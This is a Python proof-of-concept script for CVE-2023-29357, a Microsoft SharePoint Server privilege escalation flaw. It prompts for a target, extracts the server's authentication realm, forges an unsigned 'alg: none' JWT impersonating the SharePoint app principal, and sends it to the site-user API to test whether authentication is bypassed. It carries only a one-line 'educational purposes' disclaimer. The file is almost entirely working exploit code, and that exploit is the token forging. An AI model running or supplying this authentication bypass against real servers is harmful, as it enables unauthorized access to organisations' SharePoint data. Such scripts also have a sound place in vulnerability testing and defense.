import requests
import json
import re
import time
import base64
from termcolor import colored
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def getRealm(url):
    header = {
        "Authorization": "Bearer "
    }
    
    #check if url is valid
    if not url.startswith('http') or not url.startswith('https'):
        url = 'https://' + url
    try:
        response = requests.get(url + '/_api/web/curentuser', headers=header, verify=False, timeout=3)
    except Exception as e:
        return 0
    
    if response.status_code != 401:
        return 0
    
    Authenticate = response.headers.get('Www-Authenticate')
    pattern = r'realm="([^"]+)"'
    matches = re.search(pattern, Authenticate)
    if matches:
        realm = matches.group(1)
        return realm
    else:
        return 0
    
def createJwt(realm):
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    current_time = int(time.time())
    expiration_time = current_time + 3600

    payload = {
        "aud": f"00000003-0000-0ff1-ce00-000000000000@{realm}",
        "iss": "00000003-0000-0ff1-ce00-000000000000",
        "nbf": int(current_time),
        "exp": int(expiration_time),
        "ver": "hashedprooftoken",
        "nameid": f"00000003-0000-0ff1-ce00-000000000000@{realm}",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True
    }

    encode_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    encode_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    jwt_token = f"{encode_header.decode()}.{encode_payload.decode()}.AAA"
    return jwt_token

def getUser(url, jwt_token):
    header = {
        "Authorization": f"Bearer {jwt_token}",
        "Accept": "application/json",
        "X-PROOF_TOKEN": jwt_token
    }

    response = requests.get(url + '/_api/web/siteuser', verify=False, headers=header, timeout=3)
    if response.status_code != 200:
        print(colored('[Warning]', 'yellow')," Target is not vulnerable to CVE-2023-29357")
    else:
        print(colored('[Info]', 'green')," Target IS vulnerable to CVE-2023-29357")

#(CVE-2023-29357) Microsoft SharePoint Server Elevate Privilege Vulnerability
print(colored('CVE-2023-29357 (Microsoft SharePoint Server Elevate Privilege Vulnerability)', 'red'))
print(colored('This script will tell you if the target is vulnerable to CVE-2023-29357', 'green'))
print(colored('Disclaimer: This script is for educational purposes only. Do not use it against targets without prior mutual consent.', 'red'))

url = input("Target: ")

realm = getRealm(url)
if realm != 0:
    print(colored('[Info]', 'green') , f' Target is a SharePoint Server')
    print(colored('[Info]', 'green') , f' Realm: {realm}')
    token = createJwt(realm)
    print(colored('[Info]', 'green') , f' Token: {token}')
    getUser(url, token)
else:
    print(colored('[Error]', 'red') , f' Target is not a SharePoint Server')
    print(colored('[Warning]', 'yellow')," Target is not vulnerable to CVE-2023-29357")


